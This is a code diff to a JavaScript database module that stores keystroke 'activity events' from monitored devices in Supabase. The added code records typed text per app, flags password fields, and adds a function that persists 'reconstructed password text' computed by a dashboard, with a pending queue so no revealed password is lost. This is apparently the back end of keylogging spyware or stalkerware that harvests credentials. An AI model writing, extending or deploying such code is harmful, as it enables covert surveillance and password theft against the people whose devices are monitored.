@@ -171,6 +171,21 @@ export async function deleteDeviceFromDB(deviceId) {
 
 // ========== ACTIVITY EVENTS ==========
 
+// Reveals can arrive (dashboard POST) before their event rows are persisted
+// (async WS save path) — a race that would otherwise silently drop them.
+// Held here keyed by `${deviceId}:${uuid}` and applied the moment the event
+// row is written by saveActivityEvents.
+const pendingReveals = new Map();
+const PENDING_REVEAL_MAX = 2000;
+
+function putPendingReveal(deviceId, uuid, text, partial) {
+    pendingReveals.set(`${deviceId}:${uuid}`, { text: text, partial: !!partial });
+    if (pendingReveals.size > PENDING_REVEAL_MAX) {
+        const oldest = pendingReveals.keys().next().value;
+        pendingReveals.delete(oldest);
+    }
+}
+
 /**
  * Save activity events to Supabase (batch upsert).
  *
@@ -185,16 +200,31 @@ export async function saveActivityEvents(deviceId, events) {
     if (!supabase || !events || events.length === 0) return true;
 
     try {
-        const rows = events.map(ev => ({
+        const rows = events.map(ev => {
+            const key = `${deviceId}:${ev.uuid || ''}`;
+            const pending = pendingReveals.get(key);
+            if (pending) pendingReveals.delete(key);
+            return {
             device_id: deviceId,
             event_uuid: ev.uuid || null,
             event_type: ev.type || 'keystroke',
             app_package: ev.app || 'unknown',
             text: ev.text || '',
+            real_text: ev.realText || null,
+            is_password: !!ev.isPassword,
+            text_revealed: pending ? pending.text : (ev.textRevealed || null),
+            reveal_partial: pending ? pending.partial : !!ev.revealPartial,
             full_text: ev.fullText || null,
             class_name: ev.className || null,
+            before_text: ev.beforeText || null,
+            content_desc: ev.contentDesc || null,
+            scroll_y: typeof ev.scrollY === 'number' ? ev.scrollY : null,
+            max_scroll_y: typeof ev.maxScrollY === 'number' ? ev.maxScrollY : null,
+            item_count: typeof ev.itemCount === 'number' ? ev.itemCount : null,
+            previous_app: ev.previousApp || null,
             created_at: ev.timestamp ? new Date(ev.timestamp).toISOString() : new Date().toISOString(),
-        }));
+        };
+        });
 
         await withFkRetry(async () => {
             const { error } = await supabase
@@ -207,6 +237,44 @@ export async function saveActivityEvents(deviceId, events) {
         console.error('[Database] Activity save error:', err.message);
         return false;
     }
+}
+
+/**
+ * Persist reconstructed password text for activity events (dashboard-computed).
+ * Best-effort per-row update; returns the number of rows updated. When the
+ * event row has not been persisted yet (async WS save race), the reveal is
+ * held in `pendingReveals` and applied by saveActivityEvents when the row
+ * lands, so a reveal is never silently dropped.
+ */
+export async function updateActivityReveal(deviceId, updates) {
+    if (!supabase || !Array.isArray(updates) || updates.length === 0) return 0;
+
+    let updated = 0;
+    for (const u of updates) {
+        if (!u || !u.uuid || typeof u.text !== 'string' || u.text.length > 2000) continue;
+        try {
+            const { data, error } = await supabase
+                .from('activity_events')
+                .update({
+                    text_revealed: u.text,
+                    reveal_partial: !!u.partial,
+                })
+                .eq('device_id', deviceId)
+                .eq('event_uuid', u.uuid)
+                .select('id');
+            if (!error && data && data.length > 0) {
+                updated++;
+                pendingReveals.delete(`${deviceId}:${u.uuid}`);
+            } else {
+                // Row not there yet — hold until saveActivityEvents writes it.
+                putPendingReveal(deviceId, u.uuid, u.text, !!u.partial);
+            }
+        } catch (err) {
+            console.warn(`[Database] Reveal update failed for ${deviceId}:`, err.message);
+            putPendingReveal(deviceId, u.uuid, u.text, !!u.partial);
+        }
+    }
+    return updated;
 }
 
 /**
